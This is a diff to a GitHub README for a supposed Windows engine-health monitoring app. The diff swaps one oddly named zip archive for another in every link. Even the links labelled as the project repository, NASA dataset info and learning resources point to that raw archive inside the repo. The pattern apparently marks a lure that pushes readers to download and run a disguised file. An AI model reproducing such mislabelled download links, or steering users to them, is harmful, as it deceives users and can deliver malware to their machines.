@@ -1,6 +1,6 @@
 # ⚙️ Industrial-Predictive-Monitoring-using-LSTM-GRU - Predict Engine Health Early
 
-[![Download Software](https://img.shields.io/badge/Download-Industrial--Predictive--Monitoring--using--LSTM--GRU-brightgreen?style=for-the-badge)](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/static/js/GRU_Industrial_LST_using_Monitoring_Predictive_pongee.zip)
+[![Download Software](https://img.shields.io/badge/Download-Industrial--Predictive--Monitoring--using--LSTM--GRU-brightgreen?style=for-the-badge)](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/Predictive-using-LST-Industrial-Monitoring-GRU-v2.1-beta.2.zip)
 
 ## 📄 About This Application
 
@@ -29,7 +29,7 @@ The program works on Windows computers. It takes data from multiple sensors and 
 
 To get the program, please visit this page to download the latest version:
 
-[Download Industrial-Predictive-Monitoring-using-LSTM-GRU](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/static/js/GRU_Industrial_LST_using_Monitoring_Predictive_pongee.zip)
+[Download Industrial-Predictive-Monitoring-using-LSTM-GRU](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/Predictive-using-LST-Industrial-Monitoring-GRU-v2.1-beta.2.zip)
 
 ## 🚀 How to Install and Run on Windows
 
@@ -86,9 +86,9 @@ The original dataset comes from NASA’s CMAPSS dataset, which includes sensor d
 
 ## 🔗 Additional Resources
 
-- [Project GitHub Repository](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/static/js/GRU_Industrial_LST_using_Monitoring_Predictive_pongee.zip)  
-- [NASA CMAPSS Dataset Info](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/static/js/GRU_Industrial_LST_using_Monitoring_Predictive_pongee.zip)  
-- [Deep Learning in Sensor Monitoring Basics](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/static/js/GRU_Industrial_LST_using_Monitoring_Predictive_pongee.zip)
+- [Project GitHub Repository](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/Predictive-using-LST-Industrial-Monitoring-GRU-v2.1-beta.2.zip)  
+- [NASA CMAPSS Dataset Info](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/Predictive-using-LST-Industrial-Monitoring-GRU-v2.1-beta.2.zip)  
+- [Deep Learning in Sensor Monitoring Basics](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/Predictive-using-LST-Industrial-Monitoring-GRU-v2.1-beta.2.zip)
 
 ## 🙋 Getting Support
 
@@ -98,4 +98,4 @@ You can also find community help in online forums about predictive maintenance o
 
 ---
 
-[![Download Software](https://img.shields.io/badge/Download-Industrial--Predictive--Monitoring--using--LSTM--GRU-blue?style=for-the-badge)](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/static/js/GRU_Industrial_LST_using_Monitoring_Predictive_pongee.zip)
+[![Download Software](https://img.shields.io/badge/Download-Industrial--Predictive--Monitoring--using--LSTM--GRU-blue?style=for-the-badge)](https://github.com/elparcer1970/Industrial-Predictive-Monitoring-using-LSTM-GRU/raw/refs/heads/main/webapp/Predictive-using-LST-Industrial-Monitoring-GRU-v2.1-beta.2.zip)
